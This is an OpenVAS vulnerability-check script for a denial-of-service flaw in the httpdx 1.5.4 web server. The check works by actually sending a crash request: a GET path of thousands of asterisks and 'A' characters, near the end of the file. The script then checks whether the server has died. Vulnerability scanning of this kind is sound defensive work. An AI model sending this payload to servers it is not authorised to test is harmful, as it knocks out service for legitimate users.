CPE = "cpe:/a:jasper:httpdx";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802662" );
	script_version( "$Revision: 11374 $" );
	script_bugtraq_id( 54629 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2012-07-27 12:12:12 +0530 (Fri, 27 Jul 2012)" );
	script_name( "httpdx Wildcards Remote Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54629" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/19988" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (c) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_httpdx_server_detect.sc" );
	script_mandatory_keys( "httpdx/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to cause the server
to crash, denying service to legitimate users." );
	script_tag( name: "affected", value: "httpdx version 1.5.4" );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing certain http
requests and can be exploited to cause a denial of service via a specially
crafted packet." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running httpdx and is prone to denial of service
vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
port = get_app_port( cpe: CPE );
if(!port){
	exit( 0 );
}
crash = crap( data: "*", length: 2450 ) + crap( data: "A", length: 540 );
req = NASLString( "GET /", crash, " HTTP/1.0\\r\\n", "Host: ", get_host_name(), "\\r\\n\\r\\n" );
res = http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port );
}

